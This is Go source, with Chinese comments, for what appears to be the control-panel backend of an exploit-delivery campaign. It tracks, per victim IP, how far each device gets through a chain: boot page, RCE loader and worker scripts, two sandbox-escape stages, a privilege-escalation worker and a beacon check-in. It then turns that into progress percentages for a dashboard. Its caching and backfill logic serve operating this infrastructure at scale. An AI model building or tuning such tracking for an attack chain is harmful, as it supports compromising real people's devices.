package store

import (
	"sort"
	"sync"
	"sync/atomic"
	"time"
)

// 交付阶段进度权重（真机实测累计口径，总 = 100）。
//
// 用途：按设备（client IP）在交付链上到达的最远阶段，折算为进度百分比，
// 供看板进度条/设备列表展示。多实例安全：从共享 access_log 派生，任意 worker 一致。
//
//	boot   8   入口 boot.html
//	loader 18  B10/rce_loader.js
//	worker 46  B10/rce_worker_18.*.js
//	sbx0   58  /sbx0_main_18.4.js
//	sbx1   72  /sbx1_main.js
//	pe     86  /pe_worker.js
//	beacon 100 /beacon（live 巡回上线）
var StageCheckpoints = []struct {
	Name    string
	Match   string
	Percent int
}{
	{"boot", "/boot.html", 8},
	{"loader", "/rce_loader.js", 18},
	{"worker", "/rce_worker", 46},
	{"sbx0", "/sbx0_main", 58},
	{"sbx1", "/sbx1_main.js", 72},
	{"pe", "/pe_worker.js", 86},
	{"beacon", "/beacon", 100},
}

// StagePercentForPath 单条请求路径对应的阶段进度（未命中 = 0）。
func StagePercentForPath(path string) int {
	best := 0
	for _, s := range StageCheckpoints {
		if containsPath(path, s.Match) && s.Percent > best {
			best = s.Percent
		}
	}
	return best
}

// StageNameForPercent 进度值 → 阶段名（区间归属）。
func StageNameForPercent(pct int) string {
	name := "entry"
	for _, s := range StageCheckpoints {
		if pct >= s.Percent {
			name = s.Name
		}
	}
	return name
}

func containsPath(path, sub string) bool {
	if len(sub) == 0 || len(path) < len(sub) {
		return false
	}
	for i := 0; i+len(sub) <= len(path); i++ {
		if path[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// ClientStageProgress 每个 client（IP）到达的最远阶段百分比。
//
// 性能（INC-2026-0929-001 §6.1/§6.3）：该查询对 access_log 做全表 GROUP BY
// （线上 54 万行，单次约 4~5s），是设备列表聚合里最重的单条 SQL。
// ListDevices/看板/进度接口高频调用，故加 30s TTL 缓存：
// 2s 时实测每 2 秒必有一次 5s 重查询，占满连接池导致其它接口排队（刷新卡顿）；
// 进度是分钟级语义，30s 新鲜度完全够用。
func ClientStageProgress() map[string]int {
	return progCache.get()
}

type progCacheT struct {
	mu         sync.RWMutex
	data       map[string]int
	expire     time.Time
	refreshing atomic.Bool
}

var progCache = &progCacheT{}

// get SWR 语义：过期先回旧数据 + 后台异步重算（读路径永不等 4~20s 的全表聚合）；
// 冷启动（无旧数据）才同步构建一次。与 ListDevices/dashAPICache 同一模式。
func (c *progCacheT) get() map[string]int {
	c.mu.RLock()
	if time.Now().Before(c.expire) {
		d := c.data
		c.mu.RUnlock()
		return d
	}
	stale := c.data
	c.mu.RUnlock()

	if stale != nil {
		if c.refreshing.CompareAndSwap(false, true) {
			go func() {
				defer c.refreshing.Store(false)
				if d := clientStageProgressRaw(); d != nil {
					c.mu.Lock()
					c.data = d
					c.expire = time.Now().Add(30 * time.Second)
					c.mu.Unlock()
				}
			}()
		}
		return stale
	}

	c.mu.Lock()
	defer c.mu.Unlock()
	if c.data != nil && time.Now().Before(c.expire) { // double-check：等锁期间可能已被回源
		return c.data
	}
	c.data = clientStageProgressRaw()
	c.expire = time.Now().Add(30 * time.Second)
	return c.data
}

// clientStageProgressRaw 读增量维护的 client_stage（每 client 一行），
// 不再对 access_log 全表 GROUP BY（线上 640 万行时单次 60s+，是设备列表卡死根因）。
func clientStageProgressRaw() map[string]int {
	out := map[string]int{}
	db := GetDB()
	if db == nil {
		return out
	}
	rows := db.Query("SELECT client, pct FROM client_stage WHERE pct > 0")
	for _, r := range rows {
		c := toStr(r["client"])
		if c != "" {
			out[c] = int(toInt(r["pct"]))
		}
	}
	return out
}

// BackfillClientStage 一次性从 access_log 回填 client_stage（首次启用/迁移时）。
// kv 标记 client_stage_backfilled=1 保证只跑一次；幂等（GREATEST 只前进）。
// 后台执行；回填后进度查询变为小表读，彻底消除全表扫。
func BackfillClientStage() int {
	db := GetDB()
	if db == nil {
		return 0
	}
	if row := db.QueryOne("SELECT v FROM kv WHERE k='client_stage_backfilled'"); row != nil && toStr(row["v"]) == "1" {
		return 0
	}
	ts, _ := Now()
	db.Exec(`INSERT INTO client_stage(client, pct, updated_ts)
        SELECT client, MAX(
          CASE
            WHEN path = '/beacon'                THEN 100
            WHEN path LIKE '%pe_worker.js'       THEN 86
            WHEN path LIKE '%sbx1_main.js'       THEN 72
            WHEN path LIKE '%sbx0_main%'         THEN 58
            WHEN path LIKE '%rce_worker%'        THEN 46
            WHEN path LIKE '%rce_loader.js'      THEN 18
            WHEN path LIKE '%boot.html'          THEN 8
            ELSE 0
          END) AS pct, ?
        FROM access_log WHERE client <> '' GROUP BY client
        ON DUPLICATE KEY UPDATE pct=GREATEST(pct, VALUES(pct)), updated_ts=VALUES(updated_ts)`, ts)
	db.Exec("INSERT INTO kv(k,v,updated_ts) VALUES('client_stage_backfilled','1',?)"+
		" ON DUPLICATE KEY UPDATE v=VALUES(v), updated_ts=VALUES(updated_ts)", ts)
	n := 0
	if row := db.QueryOne("SELECT COUNT(*) n FROM client_stage"); row != nil {
		n = int(toInt(row["n"]))
	}
	return n
}

// StageCheckpointsJSON 阶段权重表（供前端渲染进度轴）。
func StageCheckpointsJSON() []map[string]any {
	out := make([]map[string]any, 0, len(StageCheckpoints))
	for _, s := range StageCheckpoints {
		out = append(out, map[string]any{"stage": s.Name, "percent": s.Percent})
	}
	return out
}

// StageProgressRows 进度明细（client / percent / stage），按进度降序。
func StageProgressRows() []map[string]any {
	prog := ClientStageProgress()
	rows := make([]map[string]any, 0, len(prog))
	for c, p := range prog {
		rows = append(rows, map[string]any{"client": c, "percent": p, "stage": StageNameForPercent(p)})
	}
	// 关键修复（INC-2026-1004）：原插入排序 O(n²)，client_stage 到 3.4 万行时
	// ≈5.7 亿次比较导致 /panel/api/progress 30s 超时。改 sort.Slice O(n log n)。
	// percent 已在构造时是 int，比较器直接 int 比较，避免反复 toInt。
	sort.Slice(rows, func(i, j int) bool {
		return rows[i]["percent"].(int) > rows[j]["percent"].(int)
	})
	return rows
}
